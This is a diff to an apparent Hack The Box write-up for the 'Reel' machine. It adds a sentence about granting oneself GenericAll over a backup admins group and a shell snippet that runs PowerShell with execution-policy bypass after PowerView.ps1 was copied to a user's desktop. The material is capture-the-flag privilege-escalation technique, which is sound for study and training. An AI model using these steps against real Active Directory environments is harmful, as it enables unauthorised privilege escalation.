@@ -557,8 +557,15 @@ scp PowerView.ps1 claire@reel.htb.local:C:/Users/claire/Desktop/
 claire@reel.htb.local's password: 
 PowerView.ps1
 ```
-Now its on her desktop i can give GenericAll to myself over the backup admins grou
-]
+Now its on her desktop i can give GenericAll to myself over the backup admins group
+
+```python
+PS C:\Users\claire\Desktop> powershell -ep bypass                                                                               
+Windows PowerShell                                                                                                              
+Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  
+
+PS C:\Users\claire\Desktop>
+```
 
 
 
